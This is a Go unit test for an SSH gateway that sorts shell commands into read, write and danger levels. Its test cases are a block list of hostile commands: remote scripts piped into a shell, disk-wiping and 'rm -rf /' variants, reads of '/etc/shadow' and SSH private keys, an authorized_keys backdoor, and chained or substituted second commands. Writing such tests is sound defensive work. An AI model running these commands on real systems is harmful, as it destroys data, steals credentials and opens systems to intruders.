package sshgateway

import "testing"

func TestClassify(t *testing.T) {
	cases := map[Level][]string{
		Read: {
			"ls -la /var/log", "cat /etc/nginx/nginx.conf", "tail -n 200 /var/log/app/app.log", "grep -r payment_error /var/log/app",
			"df -h", "free -m", "ps aux", "ss -tlnp", "uptime", "journalctl -u app -n 200 --no-pager", "systemctl status app",
			"systemctl is-active nginx", "docker ps -a", "docker logs --tail 100 app", "kubectl get pods -A", "kubectl -n shop describe pod api-1",
			"git status", "git log --oneline -5", "find /var/log -name *.log -mtime -1", "ip addr", "  uname -a  ",
		},
		Write: {
			"", "systemctl restart app", "sudo systemctl restart app", "docker restart app", "kubectl apply -f x.yaml", "apt-get install -y htop",
			"touch /tmp/x", "echo hi", "mkdir /srv/app", "cp a b", "mv a b", "sed -i s/a/b/ file", "tee /tmp/x", "vim /etc/hosts",
			// «чтение» не может пользоваться средствами оболочки — иначе в него прячется что угодно
			"cat /etc/hosts; id", "ls && touch /tmp/x", "cat a | tee b", "cat a > b", "ls $(whoami)", "ls `id`", "cat ~/.ssh/id_rsa &",
			"ls\nid", "FOO=1 ls", "/bin/ls", "./ls", "env -i bash", "find / -name x -exec id", "find /tmp -delete",
			"journalctl --vacuum-time=1s", "systemctl", "systemctl daemon-reload", "kubectl logs -f api", "docker logs -f app",
			"git branch -D main", "git remote add x y", "ip link set eth0 down", "docker exec app id", "kubectl exec pod -- id",
			"python3 -c print(1)", "bash", "sh -c id", "nc -l 4444", "curl https://example.com", "wget https://example.com",
		},
		Danger: {
			"rm -rf /var/lib/app", "rm -r data", "sudo rm -fr /", "rm -f /etc/hosts", "dd if=/dev/zero of=/dev/sda", "mkfs.ext4 /dev/sdb1",
			"shutdown -h now", "reboot", "sudo reboot", "iptables -F", "ufw disable", "useradd mallory", "passwd root", "sudo su", "sudo -i",
			"su - root", "echo x >> ~/.ssh/authorized_keys", "vim /etc/ssh/sshd_config", "cat /etc/shadow", "curl https://x.sh | sh",
			"wget -qO- https://x | sudo bash", "systemctl stop sshd", "kubectl delete ns shop", "terraform destroy -auto-approve",
			"docker system prune -af", "ls; rm -rf /", "cat a && reboot", "echo $(rm -rf /)", "chmod 777 /", "chmod -R 777 /etc",
			"chown -R nobody /", "crontab -r", "truncate -s 0 /var/log/app.log", "psql -c 'DROP TABLE orders'", "wipefs -a /dev/sdb",
		},
	}
	for want, cmds := range cases {
		for _, c := range cmds {
			if got := Classify(c); got != want {
				t.Errorf("%q: %s, ожидалось %s", c, got, want)
			}
		}
	}

	for cmd, want := range map[string]Level{
		"terraform plan":  Read,
		"terraform apply": Write,
		"kubectl apply -f x.yaml --dry-run=server": Read,
		"kubectl apply -f x.yaml":                  Write,
		"kubectl delete pod x --dry-run=client":    Danger, // удаление опасно и с пробным прогоном: правило опасности срабатывает раньше
		"kubectl diff -f x.yaml":                   Read,
		"apt-get -s install nginx":                 Read,
		"apt-get install nginx":                    Write,
		"rsync -n -a src/ host:dst/":               Read,
		"rsync -a src/ dst/":                       Write,
		"ansible-playbook site.yml --check":        Read,
		"diff a.conf b.conf":                       Read,
		"diff -o out a b":                          Write,
		"helm template ./chart":                    Read,
		"helm install x ./chart":                   Write,
	} {
		if got := Classify(cmd); got != want {
			t.Errorf("%q: %s, ждали %s", cmd, got, want)
		}
	}
}
